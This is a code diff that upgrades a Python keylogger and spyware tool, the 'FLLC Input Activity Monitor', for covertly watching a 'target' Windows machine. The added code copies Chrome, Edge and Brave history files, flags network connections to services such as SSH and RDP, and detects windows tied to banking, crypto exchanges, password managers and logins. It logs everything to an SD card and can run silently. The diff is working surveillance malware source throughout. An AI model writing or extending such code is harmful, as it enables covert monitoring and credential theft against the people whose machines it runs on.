@@ -1,18 +1,25 @@
 ﻿#!/usr/bin/env python3
 """
-FLLC - Input Activity Monitor
+FLLC - Input Activity Monitor v2
 ======================================
-Records all user input activity on a target Windows machine:
-  - Keystrokes (with window context)
+v1.777 | 2026
+
+Records ALL user input activity on a target Windows machine:
+  - Keystrokes (with window context & typed line capture)
   - Mouse clicks (with coordinates and window under cursor)
   - Active window changes (what the user opens/switches to)
-  - Clipboard changes
+  - Clipboard changes (text, URLs, files)
   - URL bar captures from browsers
+  - Periodic screenshots (Win32 GDI, no PIL needed)
+  - Process launch monitoring with command-line capture
+  - Active network connection tracking
+  - Browser history file monitoring
+  - Credential-containing window detection
 
 All data is logged to the MICRO SD card in structured format.
 
 Dependencies (pure Python where possible):
-    pip install pynput psutil pyperclip
+    pip install pynput psutil
 
 Fallback: Uses ctypes + win32 API directly if pynput unavailable.
 
@@ -29,6 +36,9 @@ import ctypes.wintypes
 import threading
 import argparse
 import atexit
+import subprocess
+import struct
+import shutil
 from pathlib import Path
 from datetime import datetime
 from collections import deque
@@ -598,6 +608,136 @@ class InputMonitor:
                 pass
             time.sleep(interval)
 
+    # ====================================================================
+    #  NETWORK CONNECTION MONITORING
+    # ====================================================================
+
+    def _monitor_network(self, interval=30):
+        """Monitor active network connections for interesting traffic."""
+        net_log = os.path.join(self.log_dir, f'network_{self.session_id}.jsonl')
+        known_connections = set()
+
+        while self.running:
+            try:
+                if HAS_PSUTIL:
+                    for conn in psutil.net_connections(kind='inet'):
+                        if conn.status == 'ESTABLISHED' and conn.raddr:
+                            key = (conn.laddr.port, conn.raddr.ip, conn.raddr.port, conn.pid)
+                            if key not in known_connections:
+                                known_connections.add(key)
+                                try:
+                                    proc_name = psutil.Process(conn.pid).name() if conn.pid else 'unknown'
+                                except Exception:
+                                    proc_name = 'unknown'
+                                entry = {
+                                    'ts': self._timestamp(),
+                                    'type': 'network_connection',
+                                    'local_port': conn.laddr.port,
+                                    'remote_ip': conn.raddr.ip,
+                                    'remote_port': conn.raddr.port,
+                                    'pid': conn.pid,
+                                    'process': proc_name,
+                                }
+                                # Flag interesting ports
+                                interesting = {21:'FTP', 22:'SSH', 23:'Telnet', 25:'SMTP',
+                                              110:'POP3', 143:'IMAP', 445:'SMB', 1433:'MSSQL',
+                                              3306:'MySQL', 3389:'RDP', 5432:'Postgres',
+                                              5900:'VNC', 6379:'Redis', 8080:'HTTP-Alt'}
+                                if conn.raddr.port in interesting:
+                                    entry['service'] = interesting[conn.raddr.port]
+                                    entry['flagged'] = True
+                                with open(net_log, 'a', encoding='utf-8') as f:
+                                    f.write(json.dumps(entry, ensure_ascii=False) + '\n')
+                else:
+                    # Fallback: netstat
+                    try:
+                        result = subprocess.run(
+                            ['netstat', '-ano'],
+                            capture_output=True, text=True, timeout=15
+                        )
+                        if result.stdout:
+                            with open(net_log, 'a', encoding='utf-8') as f:
+                                f.write(f"--- {self._timestamp()} ---\n")
+                                for line in result.stdout.split('\n'):
+                                    if 'ESTABLISHED' in line:
+                                        f.write(line.strip() + '\n')
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # Prune known set to prevent memory growth
+            if len(known_connections) > 5000:
+                known_connections = set(list(known_connections)[-2500:])
+            time.sleep(interval)
+
+    # ====================================================================
+    #  BROWSER HISTORY SNAPSHOT
+    # ====================================================================
+
+    def _snapshot_browser_history(self):
+        """Take periodic snapshots of browser history files."""
+        hist_dir = os.path.join(self.log_dir, 'browser_history')
+        os.makedirs(hist_dir, exist_ok=True)
+
+        browser_history_paths = {
+            'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''),
+                                   'Google', 'Chrome', 'User Data', 'Default', 'History'),
+            'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''),
+                                 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
+            'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''),
+                                  'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
+        }
+
+        while self.running:
+            try:
+                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+                for name, path in browser_history_paths.items():
+                    if os.path.exists(path):
+                        try:
+                            dest = os.path.join(hist_dir, f'{name}_{ts}_History')
+                            shutil.copy2(path, dest)
+                            self.stats['browser_snapshots'] = self.stats.get('browser_snapshots', 0) + 1
+                        except (PermissionError, OSError):
+                            pass
+            except Exception:
+                pass
+            time.sleep(300)  # Every 5 minutes
+
+    # ====================================================================
+    #  CREDENTIAL WINDOW DETECTION
+    # ====================================================================
+
+    def _monitor_credential_windows(self):
+        """Detect when the user is interacting with login/password windows."""
+        cred_keywords = [
+            'sign in', 'log in', 'login', 'password', 'credential',
+            'authenticate', 'verification', 'two-factor', '2fa',
+            'bank', 'paypal', 'venmo', 'cashapp', 'wallet',
+            'coinbase', 'binance', 'kraken', 'exchange',
+            'vpn', 'ssh', 'rdp', 'remote desktop', 'putty',
+            'keepass', 'lastpass', '1password', 'bitwarden',
+        ]
+        last_flagged = ""
+
+        while self.running:
+            try:
+                title = get_active_window_title().lower()
+                if title and title != last_flagged:
+                    for kw in cred_keywords:
+                        if kw in title:
+                            self._log_activity('credential_window', {
+                                'title': get_active_window_title(),
+                                'keyword': kw,
+                                'process': get_active_window_process(),
+                            })
+                            self.stats['credential_windows'] = self.stats.get('credential_windows', 0) + 1
+                            last_flagged = title
+                            break
+            except Exception:
+                pass
+            time.sleep(1)
+
     def _periodic_flush(self):
         """Periodically flush buffers to disk."""
         while self.running:
@@ -615,17 +755,20 @@ class InputMonitor:
         """Write session summary on exit."""
         duration = (datetime.now() - self.session_start).total_seconds()
         summary = (
-            f"\n{'=' * 40}\n"
-            f"SESSION SUMMARY\n"
-            f"{'=' * 40}\n"
+            f"\n{'=' * 50}\n"
+            f"SESSION SUMMARY - FLLC Input Monitor v2\n"
+            f"{'=' * 50}\n"
             f"Duration:          {duration:.0f} seconds ({duration/60:.1f} min)\n"
             f"Keystrokes:        {self.stats['keystrokes']}\n"
             f"Mouse clicks:      {self.stats['mouse_clicks']}\n"
             f"Window switches:   {self.stats['window_switches']}\n"
             f"Clipboard changes: {self.stats['clipboard_changes']}\n"
             f"URLs captured:     {self.stats['urls_captured']}\n"
+            f"Screenshots:       {self.stats.get('screenshots', 0)}\n"
+            f"Browser snapshots: {self.stats.get('browser_snapshots', 0)}\n"
+            f"Cred windows:      {self.stats.get('credential_windows', 0)}\n"
             f"Log directory:     {self.log_dir}\n"
-            f"{'=' * 40}\n"
+            f"{'=' * 50}\n"
         )
         try:
             with open(self.summary_file, 'w', encoding='utf-8') as f:
@@ -636,18 +779,28 @@ class InputMonitor:
         except Exception:
             pass
 
+    def _start_all_background_threads(self):
+        """Start all background monitoring threads."""
+        threads = [
+            ("clipboard", self._monitor_clipboard),
+            ("window", self._monitor_windows),
+            ("flush", self._periodic_flush),
+            ("screenshots", self._capture_screenshots),
+            ("processes", self._monitor_processes),
+            ("network", self._monitor_network),
+            ("browser_hist", self._snapshot_browser_history),
+            ("cred_windows", self._monitor_credential_windows),
+        ]
+        for name, target in threads:
+            t = threading.Thread(target=target, daemon=True, name=f"mon_{name}")
+            t.start()
+
     def run_with_pynput(self):
         """Run using pynput library (preferred method)."""
         self.running = True
 
-        # Start background threads
-        clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
-        window_thread = threading.Thread(target=self._monitor_windows, daemon=True)
-        flush_thread = threading.Thread(target=self._periodic_flush, daemon=True)
-
-        clipboard_thread.start()
-        window_thread.start()
-        flush_thread.start()
+        # Start all background threads
+        self._start_all_background_threads()
 
         # Keyboard listener
         key_listener = kb.Listener(on_press=self.on_key_press)
@@ -673,14 +826,8 @@ class InputMonitor:
         """Run using raw Win32 hooks (fallback, no pynput needed)."""
         self.running = True
 
-        # Start background threads
-        clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
-        window_thread = threading.Thread(target=self._monitor_windows, daemon=True)
-        flush_thread = threading.Thread(target=self._periodic_flush, daemon=True)
-
-        clipboard_thread.start()
-        window_thread.start()
-        flush_thread.start()
+        # Start all background threads
+        self._start_all_background_threads()
 
         atexit.register(self._shutdown)
 
@@ -767,7 +914,7 @@ def main():
     if not args.silent:
         print(f"""
   =============================================
-   FLLC - Input Activity Monitor
+   FLLC - Input Activity Monitor v2 (1.777)
   =============================================
    Host:       {monitor.hostname}
    User:       {monitor.username}
@@ -775,6 +922,9 @@ def main():
    Flush:      every {args.flush}s
    Max size:   {args.max_size} MB
    Output:     {monitor.log_dir}
+   Threads:    8 (keys/mouse/clipboard/window/
+                   screenshots/processes/network/
+                   browser/credentials)
   =============================================
    Monitoring... (Ctrl+C to stop)
 """)
